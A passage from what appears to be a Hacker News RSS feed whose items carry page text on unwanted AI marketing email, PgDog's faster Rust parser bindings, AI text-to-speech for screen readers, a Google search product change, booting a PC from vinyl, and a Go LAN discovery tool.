      &lt;p&gt;In this case, the mentioned newsletter is for promoting Lumo Business Suit to Business-related plans.&lt;/p&gt;
      &lt;p&gt;Hence, why you received it, as Product Updates and Email Subscription are two different things.&lt;/p&gt;
      &lt;p&gt;In the subscription section, you will see the âEmail Subscriptionâ category, where you can disable the newsletter in order to avoid getting it in the future.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;If I understand correctly, Proton are claiming this email is the âProton for Business newsletterâ. Not the âLumo product updatesâ newsletter.&lt;/p&gt;
    &lt;p&gt;I donât know about you, but I think thatâs baloney. Proton Support had five full business days to come up with a better excuse. Please tell me, how can I have been any more explicit about opting out of Lumo emails, only to receive âTry Lumoâ âFrom Lumoâ, and be told that is not actually a Lumo email?&lt;/p&gt;
    &lt;head rend="h2"&gt;Non-Consent&lt;/head&gt;
    &lt;p&gt;Has anyone else noticed that the AI industry canât take ânoâ for an answer? AI is being force-fed into every corner of tech. Itâs unfathomable to them that some of us arenât interested.&lt;/p&gt;
    &lt;p&gt;The entire AI industry is built upon a common principle of non-consent. They laugh in the face of IP and copyright law. AI bots DDoS websites and lie about user-agents. Can it get worse than the sickening actions of Grok? I dread to think.&lt;/p&gt;
    &lt;p&gt;As Proton has demonstrated above, and Mozilla/Firefox recently too, the AI industry simply will not accept ânoâ as an answer. Some examples like spam are more trivial than others, but the growing trend is vile and disturbing.&lt;/p&gt;
    &lt;p&gt;I do not want your AI.&lt;/p&gt;
    &lt;head rend="h3"&gt;Update for 23rd January&lt;/head&gt;
    &lt;p&gt;I guess someone at Microsoft read my post and said âhold my beerâ. This morning I woke up to a lovely gift in my inbox; âBuild Al agents with the new GitHub Copilot SDKâ.&lt;/p&gt;
    &lt;p&gt;GitHub Ensloppification is moving faster than I can delete my account for good. (Itâs an unfortunate requirement for client projects.) For the record, I have never said âyesâ to any GitHub newsletter. Even before Copilot I disabled every possible GitHub email notification.&lt;/p&gt;
    &lt;p&gt;The âUnsubscribeâ link provides the hidden newsletter list. There is nothing within GitHub account settings I can find to disable spam.&lt;/p&gt;
    &lt;p&gt;As expected, Microsoft has opted me in without my consent. The wheels are falling off at GitHub. The brutally slow front-end UI. The embarrassingly lacklustre Actions CI. Now this sloppy tripe everywhere. Reminder to developers: GitHub is not Git.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46729368</guid><pubDate>Fri, 23 Jan 2026 07:01:29 +0000</pubDate></item><item><title>Replacing Protobuf with Rust to go 5 times faster</title><link>https://pgdog.dev/blog/replace-protobuf-with-rust</link><description>&lt;doc fingerprint="ae1a93792c310158"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Replacing Protobuf with Rust to go 5 times faster&lt;/head&gt;
    &lt;p&gt;Jan 22nd, 2026&lt;lb/&gt;Lev Kokotov&lt;/p&gt;
    &lt;p&gt;PgDog is a proxy for scaling PostgreSQL. Under the hood, we use &lt;code&gt;libpg_query&lt;/code&gt; to parse and understand SQL queries. Since PgDog is written in Rust, we use its Rust bindings to interface with the core C library. 
Those bindings use Protobuf (de)serialization to work uniformly across different programming languages, e.g., the popular Ruby pg_query gem.&lt;/p&gt;
    &lt;p&gt;Protobuf is fast, but not using Protobuf is faster. We forked pg_query.rs and replaced Protobuf with direct C-to-Rust (and back to C) bindings, using bindgen and Claude-generated wrappers. This resulted in a 5x improvement in parsing queries, and a 10x improvement in deparsing (Postgres AST to SQL string conversion).&lt;/p&gt;
    &lt;head rend="h5"&gt;Results&lt;/head&gt;
    &lt;p&gt;You can reproduce these by cloning our fork and running the benchmark tests:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Function&lt;/cell&gt;
        &lt;cell role="head"&gt;Queries per second&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;&lt;code&gt;pg_query::parse&lt;/code&gt; (Protobuf)&lt;/cell&gt;
        &lt;cell&gt;613&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;&lt;code&gt;pg_query::parse_raw&lt;/code&gt; (Direct C to Rust)&lt;/cell&gt;
        &lt;cell&gt;3357 (5.45x faster)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;&lt;code&gt;pg_query::deparse&lt;/code&gt; (Protobuf)&lt;/cell&gt;
        &lt;cell&gt;759&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;&lt;code&gt;pg_query::deparse_raw&lt;/code&gt; (Direct Rust to C)&lt;/cell&gt;
        &lt;cell&gt;7319 (9.64x faster)&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h3"&gt;The process&lt;/head&gt;
    &lt;p&gt;The first step is always profiling. We use samply, which integrates nicely with the Firefox profiler. Samply is a sampling profiler: it measures how much time code spends running CPU instructions in each function. It works by inspecting the application call stack thousands of times per second. The more time is spent inside a particular function (or span, as they are typically called), the slower that code is. This is how we discovered &lt;code&gt;pg_query_parse_protobuf&lt;/code&gt;:&lt;/p&gt;
    &lt;p&gt;This is the entrypoint to the &lt;code&gt;libpg_query&lt;/code&gt; C library, used by all pg_query bindings. The function that wraps the actual Postgres parser, &lt;code&gt;pg_query_raw_parse&lt;/code&gt;, barely registered on the flame graph. Parsing queries isn’t free, but the Postgres parser itself is very quick and has been optimized for a long time. With the hot spot identified, our first instinct was to do nothing and just add a cache.&lt;/p&gt;
    &lt;head rend="h4"&gt;Caching mostly works&lt;/head&gt;
    &lt;p&gt;Caching is a trade-off between memory and CPU utilization, and memory is relatively cheap (latest DRAM crunch notwithstanding). The cache is mutex-protected, uses the LRU algorithm and is backed by a hashmap1. The query text is the key and the Abstract Syntax Tree is the value, which expects most apps to use prepared statements. The query text contains placeholders instead of actual values and is therefore reusable, for example:&lt;/p&gt;
    &lt;code&gt;SELECT * FROM users WHERE id = $1;
&lt;/code&gt;
    &lt;p&gt;While the &lt;code&gt;id&lt;/code&gt; parameter can change between invocations, the prepared statement does not, so we could cache its static AST in memory.&lt;/p&gt;
    &lt;p&gt;This works pretty well, but eventually we ran into a couple of issues:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Some ORMs can have bugs that generate thousands of unique statements, e.g., &lt;code&gt;value IN ($1, $2, $3)&lt;/code&gt;instead of&lt;code&gt;value = ANY($1)&lt;/code&gt;, which causes a lot of cache misses&lt;/item&gt;
      &lt;item&gt;Applications use old PostgreSQL client drivers which don’t support prepared statements, e.g., Python’s &lt;code&gt;psycopg2&lt;/code&gt;package&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The clock on Protobuf was ticking and we needed to act. So, like a lot of engineers these days, we asked an LLM to just do it for us.&lt;/p&gt;
    &lt;head rend="h4"&gt;Tight constraints&lt;/head&gt;
    &lt;p&gt;I’m going to preface this section by saying that the vast majority of PgDog’s source code is written by a human. AI is not in a position to one-shot a connection pooler, load balancer and database sharder. However, when scoped to a very specific, well-defined and most importantly machine-verifiable task, it can work really well.&lt;/p&gt;
    &lt;p&gt;The prompt we started with was pretty straightforward:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;libpg_query is a library that wraps the PostgreSQL parser in an API. pg_query.rs is a Rust wrapper around libpg_query which uses Protobuf for (de)serialization. Replace Protobuf with bindgen-generated Rust structs that map directly to the Postgres AST.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;And after two days of back and forth between us and the machine, it worked. We ended up with 6,000 lines of recursive Rust that manually mapped C types and structs to Rust structs, and vice versa. We made the switch for &lt;code&gt;parse&lt;/code&gt;, &lt;code&gt;deparse&lt;/code&gt; (used in our new query rewrite engine, which we’ll talk about in another post), &lt;code&gt;fingerprint&lt;/code&gt; and &lt;code&gt;scan&lt;/code&gt;. These four methods are heavily used in PgDog to make sharding work, and we immediately saw a 25% improvement in pgbench benchmarks2.&lt;/p&gt;
    &lt;p&gt;Just to be clear: we had a lot of things going for us already that made this possible. First, pg_query has a Protobuf spec for protoc (and Prost, the Protobuf Rust implementation) to generate bindings, so Claude was able to get a comprehensive list of structs it needed to extract from C, along with the expected data types.&lt;/p&gt;
    &lt;p&gt;Second, pg_query.rs was already using bindgen, so we had to just copy/paste some invocations around to get the AST structs included in bindgen’s output.&lt;/p&gt;
    &lt;p&gt;And last, and definitely not least, pg_query.rs already had a working &lt;code&gt;parse&lt;/code&gt; and &lt;code&gt;deparse&lt;/code&gt; implementation, so we could test our AI-generated code against its output. This was entirely automated and verifiable: for each test case that used &lt;code&gt;parse&lt;/code&gt;, we included a call to &lt;code&gt;parse_raw&lt;/code&gt;, compared their results and if they differed by even one byte, Claude Code had to go back and try again.&lt;/p&gt;
    &lt;head rend="h4"&gt;The implementation&lt;/head&gt;
    &lt;p&gt;The translation code between Rust and C uses &lt;code&gt;unsafe&lt;/code&gt; Rust functions that wrap Rust structs to C structs. The C structs are then passed to the Postgres/libpg_query C API which does the actual work of building the AST.&lt;/p&gt;
    &lt;p&gt;The result is converted back to Rust using a recursive algorithm: each node in the AST has its own converter function which accepts an &lt;code&gt;unsafe&lt;/code&gt; C pointer and returns a safe Rust struct. Much like the name suggests, the AST is a tree, which is stored in an array:&lt;/p&gt;
    &lt;code&gt;unsafe fn convert_list_to_raw_stmts(
    list: *mut bindings_raw::List
) -&amp;gt; Vec&amp;lt;protobuf::RawStmt&amp;gt; {
    // C-to-Rust conversion.
}
&lt;/code&gt;
    &lt;p&gt;For each node in the list, the implementation calls &lt;code&gt;convert_node&lt;/code&gt;, which then handles each one of the 100s of tokens available in the SQL grammar:&lt;/p&gt;
    &lt;code&gt;unsafe fn convert_node(
    node_ptr: *mut bindings_raw::Node
) -&amp;gt; Option&amp;lt;protobuf::Node&amp;gt; {
    // This is basically C in Rust, so we better check for nulls!
    if node_ptr.is_null() {
        return None;
    }

    match (*node_ptr).type_ {
        // SELECT statement root node.
        bindings_raw::NodeTag_T_SelectStmt =&amp;gt; {
            let stmt = node_ptr as *mut bindings_raw::SelectStmt;
            Some(protobuf::node::Node::SelectStmt(Box::new(convert_select_stmt(&amp;amp;*stmt))))
        }
        
        // INSERT statement root node.
        bindings_raw::NodeTag_T_InsertStmt =&amp;gt; {
            let stmt = node_ptr as *mut bindings_raw::InsertStmt;
            Some(protobuf::node::Node::InsertStmt(Box::new(convert_insert_stmt(&amp;amp;*stmt))))
        }
        
        // ... 100s more nodes.
    }
}
&lt;/code&gt;
    &lt;p&gt;For nodes that contain other nodes, we recurse on &lt;code&gt;convert_node&lt;/code&gt; again until the algorithm reaches the leaves (nodes with no children) and terminates. For nodes that contain scalars, like a number (e.g., &lt;code&gt;5&lt;/code&gt;) or text (e.g., &lt;code&gt;'hello world'&lt;/code&gt;), the data type is copied into a Rust analog, e.g., &lt;code&gt;i32&lt;/code&gt; or &lt;code&gt;String&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;The end result is &lt;code&gt;protobuf::ParseResult&lt;/code&gt;, a Rust struct generated by Prost from the pg_query API Protobuf specification, but populated by native Rust code instead of Prost’s deserializer. Reusing existing structs reduces the chance of errors considerably: we can compare &lt;code&gt;parse&lt;/code&gt; and &lt;code&gt;parse_raw&lt;/code&gt; outputs, using the derived &lt;code&gt;PartialEq&lt;/code&gt; trait, and ensure that both are identical, in testing.&lt;/p&gt;
    &lt;p&gt;While recursive algorithms have a questionable reputation in the industry because bad ones can cause stack overflows, they are very fast. Recursion requires no additional memory allocation because all of its working space, the stack, is created on program startup. It also has excellent CPU cache locality because the instructions for the next invocation of the same function are already in the CPU L1/L2/L3 cache. Finally and arguably more importantly, they are just easier to read and understand than iterative implementations, which helps us, the humans, with debugging.&lt;/p&gt;
    &lt;p&gt;Just for good measure, we tried generating an iterative algorithm, but it ended up being slower than Prost. The main cause (we think) was unnecessary memory allocations, hashmap lookups of previously converted nodes, and too much overhead from walking the tree several times. Meanwhile, recursion processes each AST node exactly once and uses the stack pointer to track its position in the tree. If you have any ideas on how to make an iterative algorithm work better, let us know!&lt;/p&gt;
    &lt;head rend="h3"&gt;Closing thoughts&lt;/head&gt;
    &lt;p&gt;Reducing the overhead from using the Postgres parser in PgDog makes a huge difference for us. As a network proxy, our budget for latency, memory utilization, and CPU cycles is low. After all, we aren’t a real database…yet! This change improves performance from two angles: we use less CPU and we do less work, so PgDog is faster and cheaper to run.&lt;/p&gt;
    &lt;p&gt;If stuff like this is interesting to you, reach out. We are looking for a Founding Software Engineer to help us grow and build the next iteration of horizontal scaling for PostgreSQL.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46730214</guid><pubDate>Fri, 23 Jan 2026 09:03:31 +0000</pubDate></item><item><title>The state of modern AI text to speech systems for screen reader users</title><link>https://stuff.interfree.ca/2026/01/05/ai-tts-for-screenreaders.html</link><description>&lt;doc fingerprint="85deb33a0b1ab384"&gt;
  &lt;main&gt;
    &lt;p&gt;If you're not a screen reader user yourself, you might be surprised to learn that the text to speech technology used by most blind people hasn't changed in the last 30 years. While text to speech has taken the sighted world by storm, in everything from personal assistants to GPS to telephone systems, the voices used by blind folks have remained mostly static. This is largely intentional. The needs of a blind text to speech user are vastly different than those of a sighted user. While sighted users prefer voices that are natural, conversational, and as human-like as possible, blind users tend to prefer voices that are fast, clear, predictable, and efficient. This results in a preference among blind users for voices that sound somewhat robotic, but can be understood at high rates of speed, often upwards of 800 to 900 words per minute. The speaking rate of an average person hovers around 200 to 250 words per minute, for comparison.&lt;/p&gt;
    &lt;p&gt;Unfortunately, this difference in needs has resulted in blind people getting left out of the explosion of text to speech advancement, and has caused many problems. First, the voice that is preferred by the majority of western English blind users, called Eloquence, was last updated in 2003. While it is so overwhelmingly popular that even Apple was eventually pressured to add the voice to iPhone, mac, Apple TV, and Apple Watch, even they were forced to use an emulation layer. As Eloquence is a 32-bit voice last compiled in 2003, it cannot run in modern software without some sort of emulation or bridge. If the sourcecode to Eloquence still exists and can be compiled, even large companies like Apple haven't managed to find or compile it. As the NVDA screen reader moves from being a 32-bit application to a 64-bit one, keeping eloquence running with it has been a challenge that I and many other community members have spent a lot of time and effort solving. The eloquence libraries also have many known security issues, and anyone using the libraries today is forced to understand and program around them, as Eloquence itself can never be updated or fixed. These stopgap solutions are entirely untenable, and are likely to take us only so far. A better solution is urgently needed.&lt;/p&gt;
    &lt;p&gt;The second problem this has caused is for those who speak languages other than English. As most modern text to speech voices are created by and for sighted users, blind users begin to find that the voices available in less popular languages are inefficient, overly conversational, slow, and otherwise unsatisfactory. While espeak-ng is an open-source text to speech system that attempts to support hundreds of languages while meeting the needs of blind users, it brings a different set of problems to the table. First, many of the languages it supports were added based on pronunciation rules taken from Wikipedia articles, without involving speakers of the language. Second, Espeak-ng is based directly on Speak, a text to speech system written by Jonathan Duddington in 1995 for RISC OS on the BBC Micro, meaning that espeak users today continue to have to live with many of the design decisions made back in 1995 for an operating system that no longer exists. Third, looking at the Espeak-ng repository, it seems to only have one or two active maintainers. While this is obviously better than the zero active maintainers of Eloquence, it could still become a problem in the future.&lt;/p&gt;
    &lt;p&gt;These are the reasons that I'm always interested in advancements in text to speech, and am actively keeping my ears open for something that takes advantage of modern technology, while continuing to suit the needs of screen reader users like myself.&lt;/p&gt;
    &lt;p&gt;Over the holiday break, I decided to take a look at two modern AI-based text to speech systems, and see if they could be added to NVDA. I chose two models, because they advertised themselves as fast, able to run without a GPU, and responsive. The first was supertonic, and the second was Kitten TTS. As both models require 64-bit Python, I wrote the addons for the 64-bit alpha of NVDA. However, other than making development easier, this had little effect on the results.&lt;/p&gt;
    &lt;p&gt;Unfortunately, doing this work uncovered a number of issues that I believe are common to all of the modern AI-based text to speech systems, and make them unsuitable for use in screen readers. The first issue is dependency bloat. In order to bundle these systems as NVDA addons, developers are required to include a vast multitude of large and complex Python packages. In the case of Kitten TTS, the number is around 103, and just over 30 for supertonic. As the standard building and packaging methods for NVDA addons do not support specifying and building requirements, these dependencies need to be manually copied over, included in any github repositories, and cannot be automatically updated. Loading all of these dependencies directly into NVDA also causes the screen reader to load slower, use more system resources, and opens NVDA users up to any security issue in any of these libraries. As a screen reader needs access to the entire system, this is far from ideal.&lt;/p&gt;
    &lt;p&gt;The second issue is accuracy. These modern systems are developed to sound human, natural, and conversational. Unfortunately this seems to come at the expense of accuracy. In my testing, both models had a tendency to skip words, read numbers incorrectly, chop off short utterances, and ignore prosody hints from text punctuation. Kitten TTS is slightly better here, as it uses a deterministic phonemizer (the same one used by espeak, actually) to determine the correct way to pronounce words, leaving only the generation of the speech itself up to AI. But never the less, Kitten TTS is still far from perfectly accurate. When it comes to use in a screen reader, skipping words, or reading numbers incorrectly, is unacceptable.&lt;/p&gt;
    &lt;p&gt;The third issue is speed. Supertonic has the edge, here, but even it is far too slow. Unlike older text to speech systems, Supertonic and Kitten TTS cannot begin generating speech until they have an entire chunk of text. Supertonic is slightly faster, as it can stream result audio as it becomes available, whereas Kitten TTS cannot start speaking until all of the audio for the chunk is fully generated. But for use in a screen reader, a text to speech system needs to begin generating speech as quickly as possible, rather than waiting for an entire phrase or sentence. Users of screen readers quickly jump through text and frequently interrupt the screen reader, and thus require the text to speech system to be able to quickly discard and restart speech.&lt;/p&gt;
    &lt;p&gt;The fourth and final issue is control. Older text to speech systems make changing the pitch, speed, volume, breathiness, roughness, headsize, and other parameters of the voice easy. This allows screen reader users to customize the voice to our exact needs, as well as offering the ability to change the characteristics of the voice in real time based on the formatting or other attributes of the text. AI text to speech models, being trained on data from a particular set of speakers, cannot offer this customization. Instead, they inherit the speaking speed, pitch, volume, and other characteristics that were present in the training data. Kitten TTS and Supertonic both offer basic speed control, however it is highly variable from voice to voice and utterance to utterance. This leads to a loss of functionality that many blind users depend on.&lt;/p&gt;
    &lt;p&gt;If you'd like to experience these issues for yourself, feel free to follow the links above to my GitHub repositories. They offer ready to install addons that can be installed and used with the 64-bit NVDA alphas.&lt;/p&gt;
    &lt;p&gt;I'm picking on Kitten TTS and Supertonic not because they're particularly bad for the above problems, but because they're the models that are the state of the art in AI text to speech right now when it comes to speed and size. Other models, like Kokoro, exhibit all of the same issues, but more so.&lt;/p&gt;
    &lt;p&gt;So what's the way forward for blind screen reader users? Sadly, I don't know. Modern text to speech research has little to no overlap with our requirements. Using Eloquence, the system that many blind people find best, is becoming increasingly untenable. ESpeak uses an odd architecture originally designed for computers in 1995, and has few maintainers. Blastbay Studios has done some interesting work to create a text to speech voice using modern design and technology, that meets the requirements of blind users. But it's a closed-source product with a single maintainer, that also suffers from a lack of pronunciation accuracy. In an ideal world, someone would re-implement Eloquence as a set of open source libraries. However, doing so would require expertise in linguistics, digital signal processing, and audiology, as well as excellent programming abilities. My suspicion is that modernizing the text to speech stack that is preferred by blind power-users is an effort that would require several million dollars of funding at minimum. Instead, we'll probably wind up having to settle for text to speech voices that are "good enough", while being nowhere near as fast and efficient as what we have currently. Personally, I intend to keep Eloquence limping along for as long as I can, until the layers of required emulation and bridges make real time use impossible. Perhaps at that point AI will be good enough that it can be prompted to create a text to speech system that's up to our standards. Or, more hopefully, articles like this one may bring attention to the issues, and bring our community together to recognize the problems and find solutions.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46730346</guid><pubDate>Fri, 23 Jan 2026 09:24:27 +0000</pubDate></item><item><title>Updates to our web search products and  Programmable Search Engine capabilities</title><link>https://programmablesearchengine.googleblog.com/2026/01/updates-to-our-web-search-products.html</link><description>&lt;doc fingerprint="da81bed20394e73a"&gt;
  &lt;main&gt;
    &lt;p&gt;Evolving Programmable Search Engine&lt;/p&gt;
    &lt;p&gt;Programmable Search Engine helps hundreds of partners – from academic institutions to retail websites – serve their users’ search needs on their sites.&lt;/p&gt;
    &lt;p&gt;Looking forward, we’ll be evolving our offerings to provide more focused and capable solutions for every use case. This evolution is designed to ensure a high-quality experience for users and partners.&lt;/p&gt;
    &lt;p&gt;A clearer path for every search need&lt;/p&gt;
    &lt;p&gt;We're simplifying and modernizing our offerings so you can choose the best tool for your goals.&lt;/p&gt;
    &lt;p&gt;For site-specific search: The Programmable Search Element (the “Search Element”) is being simplified to be the best tool for creating rich, focused search experiences on your own websites. This solution is intended for website owners who cater focused content to a specific audience.&lt;/p&gt;
    &lt;p&gt;For enterprise-grade needs: For advanced features like AI-powered conversational search and enterprise-grade grounding, we continue to offer Google Vertex AI Search as a solution.&lt;/p&gt;
    &lt;p&gt;For full web search needs: We understand some partners have use cases that require querying beyond a designated subset of domains. Our full web search solution is available for those requiring our entire index; please complete this form to register your interest .&lt;/p&gt;
    &lt;p&gt;Planning your transition to more powerful tools&lt;/p&gt;
    &lt;p&gt;We are excited to help you harness the full potential of these evolving solutions. As you plan for the future, here is your path forward for the transition, which can be completed any time between now and January 1, 2027.&lt;/p&gt;
    &lt;p&gt;“Sites to search” feature for users of the Search Element querying 50 or fewer domains: The Search Element remains the optimal solution for delivering highly optimized and focused results. With this free feature, you can designate a maximum number of 50 domains for site-specific searches.&lt;/p&gt;
    &lt;p&gt;“Search the entire web” option for users of the Search Element querying more than 50 domains: If your use case necessitates querying more than 50 domains or is set to “Search the entire web”, contact us to express your interest in the more advanced full web search solution and get more information about its capabilities and pricing. Your transition to an alternative solution needs to be completed by January 1, 2027.&lt;/p&gt;
    &lt;p&gt;For users of the Custom Search JSON API: Vertex AI Search is a favorable alternative for up to 50 domains. Alternatively, if your use case necessitates full web search, contact us to express your interest in and get more information about our full web search solution. Your transition to an alternative solution needs to be completed by January 1, 2027.&lt;/p&gt;
    &lt;p&gt;To prepare for this transition, as of today, all new engines must be configured to use the “Sites to search” feature. This change impacts only new engines; existing engines are not affected and can continue to use the “Search the entire web” option until January 1, 2027.&lt;/p&gt;
    &lt;p&gt;This evolution will help us create more focused products, so we can provide a better search experience for our developer partners. We’re excited to build the future of search with you.&lt;/p&gt;
    &lt;p&gt;Thank you,&lt;/p&gt;
    &lt;p&gt;The Google Programmable Search Engine Team&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46730436</guid><pubDate>Fri, 23 Jan 2026 09:38:02 +0000</pubDate></item><item><title>AI Usage Policy</title><link>https://github.com/ghostty-org/ghostty/blob/main/AI_POLICY.md</link><description>&lt;doc fingerprint="eb7ad05e09566404"&gt;
  &lt;main&gt;
    &lt;p&gt;We read every piece of feedback, and take your input very seriously.&lt;/p&gt;
    &lt;p&gt;To see all available qualifiers, see our documentation.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46730504</guid><pubDate>Fri, 23 Jan 2026 09:50:26 +0000</pubDate></item><item><title>Booting from a vinyl record (2020)</title><link>https://boginjr.com/it/sw/dev/vinyl-boot/</link><description>&lt;doc fingerprint="5c71fe289328686"&gt;
  &lt;main&gt;
    &lt;p&gt;Most PCs tend to boot from a primary media storage, be it a hard disk drive, or a solid-state drive, perhaps from a network, or – if all else fails – the USB stick or the boot DVD comes to the rescue… Fun, eh? Boring! Why don’t we try to boot from a record player for a change?&lt;/p&gt;
    &lt;p&gt;64 512 byte DOS boot disk on a 10″ record, total playing time 06:10 on 45 rpm&lt;/p&gt;
    &lt;p&gt;Update February 2022: Click here to observe the very same vinyl ramdisk booted on an IBM PCjr!&lt;lb/&gt; So this nutty little experiment connects a PC, or an IBM PC to be exact, directly onto a record player through an amplifier. I made a small ROM on-chip boot loader that operates the built-in “cassette interface” of the PC (that was hardly ever used), which will now be invoked by the BIOS if all the other boot options fail, i.e. floppy disk and the hard drive. The turntable spins an analog recording of a small bootable read-only RAM drive, which is 64K in size. This contains a FreeDOS kernel, modified by me to cram it into the memory constraint, a micro variant of COMMAND.COM and a patched version of INTERLNK, that allows file transfer through a printer cable, modified to be runnable on FreeDOS. The bootloader reads the disk image from the audio recording through the cassette modem, loads it to memory and boots the system on it. Simple huh?&lt;/p&gt;
    &lt;p&gt;The vinyl loader code, in a ROM&lt;lb/&gt; (It can also reside on a hard drive or a floppy, but that’d be cheating)&lt;/p&gt;
    &lt;p&gt;And now to get more technical: this is basically a merge between BootLPT/86 and 5150CAXX, minus the printer port support. It also resides in a ROM, in the BIOS expansion socket, but it does not have to. The connecting cable between the PC and the record player amplifier is the same as with 5150CAXX, just without the line-in (PC data out) jack.&lt;lb/&gt; The “cassette interface” itself is just PC speaker timer channel 2 for the output, and 8255A-5 PPI port C channel 4 (PC4, I/O port 62h bit 4) for the input. BIOS INT 15h routines are used for software (de)modulation.&lt;lb/&gt; The boot image is the same 64K BOOTDISK.IMG “example” RAM drive that can be downloaded at the bottom of the BootLPT article. This has been turned into an “IBM cassette tape”-protocol compliant audio signal using 5150CAXX, and sent straight to a record cutting lathe.&lt;lb/&gt; Vinyls are cut with an RIAA equalization curve that a preamp usually reverses during playback, but not perfectly. So some signal correction had to be applied from the amplifier, as I couldn’t make it work right with the line output straight from the phono preamp. In my case, involving a vintage Harman&amp;amp;Kardon 6300 amplifier with an integrated MM phono preamp, I had to fade the treble all the way down to -10dB/10kHz, increase bass equalization to approx. +6dB/50Hz and reduce the volume level to approximately 0.7 volts peak, so it doesn’t distort. All this, naturally, with any phase and loudness correction turned off.&lt;lb/&gt; Of course, the cassette modem does not give a hoot in hell about where the signal is coming from. Notwithstanding, the recording needs to be pristine and contain no pops or loud crackles (vinyl) or modulation/frequency drop-outs (tape) that will break the data stream from continuing. However, some wow is tolerated, and the speed can be 2 or 3 percent higher or lower too.&lt;/p&gt;
    &lt;p&gt;Bootloader in a ROM; being an EPROM for a good measure&lt;/p&gt;
    &lt;p&gt;And that’s it! For those interested, the bootloader binary designed for a 2364 chip (2764s can be used, through an adaptor), can be obtained here. It assumes an IBM 5150 with a monochrome screen and at least 512K of RAM, which kind of reminds me of my setup (what a coincidence). The boot disk image can be obtained at the bottom of the BootLPT/86 article, and here’s its analog variant, straight from the grooves 🙂&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46730885</guid><pubDate>Fri, 23 Jan 2026 10:39:09 +0000</pubDate></item><item><title>Show HN: Whosthere: A LAN discovery tool with a modern TUI, written in Go</title><link>https://github.com/ramonvermeulen/whosthere</link><description>&lt;doc fingerprint="b709fb1d9ea3f390"&gt;
  &lt;main&gt;
    &lt;p&gt;Local Area Network discovery tool with a modern Terminal User Interface (TUI) written in Go. Discover, explore, and understand your LAN in an intuitive way.&lt;/p&gt;
    &lt;p&gt;Whosthere performs unprivileged, concurrent scans using mDNS and SSDP scanners. Additionally, it sweeps the local subnet by attempting TCP/UDP connections to trigger ARP resolution, then reads the ARP cache to identify devices on your Local Area Network. This technique populates the ARP cache without requiring elevated privileges. All discovered devices are enhanced with OUI lookups to display manufacturers when available.&lt;/p&gt;
    &lt;p&gt;Whosthere provides a friendly, intuitive way to answer the question every network administrator asks: "Who's there on my network?"&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Modern TUI: Navigate and explore discovered devices intuitively.&lt;/item&gt;
      &lt;item&gt;Fast &amp;amp; Concurrent: Leverages multiple discovery methods simultaneously.&lt;/item&gt;
      &lt;item&gt;No Elevated Privileges Required: Runs entirely in user-space.&lt;/item&gt;
      &lt;item&gt;Device Enrichment: Uses OUI lookup to show device manufacturers.&lt;/item&gt;
      &lt;item&gt;Integrated Port Scanner: Optional service discovery on found hosts (only scan devices with permission!).&lt;/item&gt;
      &lt;item&gt;Daemon Mode with HTTP API: Run in the background and integrate with other tools.&lt;/item&gt;
      &lt;item&gt;Theming &amp;amp; Configuration: Personalize the look and behavior via YAML configuration.&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;brew tap ramonvermeulen/whosthere
brew install whosthere&lt;/code&gt;
    &lt;p&gt;Or with Go:&lt;/p&gt;
    &lt;code&gt;go install github.com/ramonvermeulen/whosthere@latest&lt;/code&gt;
    &lt;p&gt;Or build from source:&lt;/p&gt;
    &lt;code&gt;git clone https://github.com/ramonvermeulen/whosthere.git
cd whosthere
make build&lt;/code&gt;
    &lt;p&gt;Run the TUI for interactive discovery:&lt;/p&gt;
    &lt;code&gt;whosthere&lt;/code&gt;
    &lt;p&gt;Run as a daemon with HTTP API:&lt;/p&gt;
    &lt;code&gt;whosthere daemon --port 8080&lt;/code&gt;
    &lt;p&gt;Additional command line options can be found by running:&lt;/p&gt;
    &lt;code&gt;whosthere --help&lt;/code&gt;
    &lt;p&gt;Whosthere is supported on the following platforms:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Linux&lt;/item&gt;
      &lt;item&gt;macOS&lt;/item&gt;
      &lt;item&gt;Windows (maybe in the future, contributions welcome!)&lt;/item&gt;
    &lt;/list&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Key&lt;/cell&gt;
        &lt;cell role="head"&gt;Action&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;/&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Start regex search&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;k&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Up&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
